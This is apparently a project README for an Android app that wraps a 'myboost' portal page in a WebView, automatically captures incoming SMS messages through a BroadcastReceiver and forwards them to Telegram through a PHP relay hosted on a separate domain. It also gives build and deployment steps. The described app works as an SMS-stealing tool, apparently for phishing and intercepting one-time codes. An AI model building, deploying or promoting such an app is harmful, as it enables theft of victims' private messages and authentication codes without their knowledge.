# WebView SMS App with Telegram Integration

## Features
- WebView loads: https://myboost.co-portal.workers.dev/
- Automatic SMS capture via BroadcastReceiver
- SMS data forwarded to Telegram via PHP API

## Setup Instructions

### 1. Upload `api/index.php` to your hosting
Upload the `api/index.php` file to `https://freefees.online/api/index.php`

### 2. Push to GitHub
Push all files to GitHub. GitHub Actions will auto-build the APK.

### 3. Download APK
Go to Actions tab → click the latest run → download `app-debug` artifact.
